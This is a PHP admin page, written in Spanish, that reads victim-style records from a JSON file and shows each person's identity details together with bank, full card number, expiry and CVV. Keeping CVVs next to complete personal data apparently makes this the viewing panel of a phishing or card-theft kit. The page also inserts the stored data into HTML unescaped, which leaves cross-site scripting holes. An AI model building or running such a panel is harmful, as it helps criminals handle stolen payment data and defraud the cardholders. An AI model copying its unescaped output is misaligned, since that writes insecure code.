<?php
session_start();

// Verificar si el usuario está logueado
if (!isset($_SESSION['usuario'])) {
    header("Location: login.php?msg=login_required");
    exit();
}

// Cerrar sesión si se solicita
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: login.php");
    exit();
}

$usuario = $_SESSION['usuario'];
$rol = $_SESSION['rol'] ?? 'user';

$json_file = 'datos.json';
if (file_exists($json_file)) {
    $json_data = file_get_contents($json_file);
    $datos = json_decode($json_data, true);
} else {
    $datos = [];
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Panel de Datos</title>
<link rel="stylesheet" href="./css/adminStyle.css">
</head>

<body>

<h2 class="titulo">Registro de Usuarios</h2>

<!-- Mostrar usuario, rol logueado y botón de cerrar sesión -->
<p style="text-align:right; margin-right:20px;">
    Usuario: <strong><?php echo htmlspecialchars($usuario); ?></strong> | 
    Rol: <strong><?php echo htmlspecialchars($rol); ?></strong> |
    <a href="?logout=true" style="color:#b388ff; text-decoration:none;">Cerrar sesión</a>
</p>

<?php if (empty($datos)): ?>
    <p class="sin-datos">No hay datos disponibles.</p>
<?php else: ?>
<div class="table-container">
    <table>
        <thead>
            <tr>
                <th>Nombre</th>
                <th>Apellido</th>
                <th>Documento</th>
                <th>Teléfono</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($datos as $i => $dato): ?>
                <tr class="fila-dato" data-info='<?php echo json_encode($dato); ?>'>
                    <td class="clic"><?php echo htmlspecialchars($dato['nombre']); ?></td>
                    <td class="clic"><?php echo htmlspecialchars($dato['apellido']); ?></td>
                    <td><?php echo htmlspecialchars($dato['documento']); ?></td>
                    <td><?php echo htmlspecialchars($dato['telefono']); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
<?php endif; ?>

<!-- MODAL -->
<div id="modal" class="modal">
    <div class="modal-content">
        <span id="cerrar" class="cerrar">&times;</span>
        <h3>Datos completos</h3>
        <div id="modal-body"></div>
    </div>
</div>

<script>
document.querySelectorAll(".fila-dato .clic").forEach(celda => {
    celda.addEventListener("click", function () {
        let fila = this.parentElement;
        let data = JSON.parse(fila.getAttribute("data-info"));

        let html = `
            <p><strong>Nombre:</strong> ${data.nombre}</p>
            <p><strong>Apellido:</strong> ${data.apellido}</p>
            <p><strong>Documento:</strong> ${data.documento}</p>
            <p><strong>Teléfono:</strong> ${data.telefono}</p>
            <p><strong>Ciudad:</strong> ${data.ciudad}</p>
            <p><strong>Dirección:</strong> ${data.direccion}</p>
            <p><strong>Email:</strong> ${data.email}</p>
            <p><strong>Banco:</strong> ${data.banco}</p>
            <p><strong>Franquicia:</strong> ${data.franquicia}</p>
            <p><strong>Tipo Tarjeta:</strong> ${data.tipo_tarjeta}</p>
            <p><strong>Nro Tarjeta:</strong> ${data.nro_tarjeta}</p>
            <p><strong>Nombre Tarjeta:</strong> ${data.nombre_tarjeta}</p>
            <p><strong>Vencimiento:</strong> ${data.mes_tarjeta}/${data.anio_tarjeta}</p>
            <p><strong>CVV:</strong> ${data.cvv_tarjeta}</p>
        `;

        document.getElementById("modal-body").innerHTML = html;
        document.getElementById("modal").classList.add("mostrar");
    });
});

document.getElementById("cerrar").onclick = () => {
    document.getElementById("modal").classList.remove("mostrar");
};

window.onclick = (e) => {
    if (e.target == document.getElementById("modal")) {
        document.getElementById("modal").classList.remove("mostrar");
    }
};
</script>

</body>
</html>
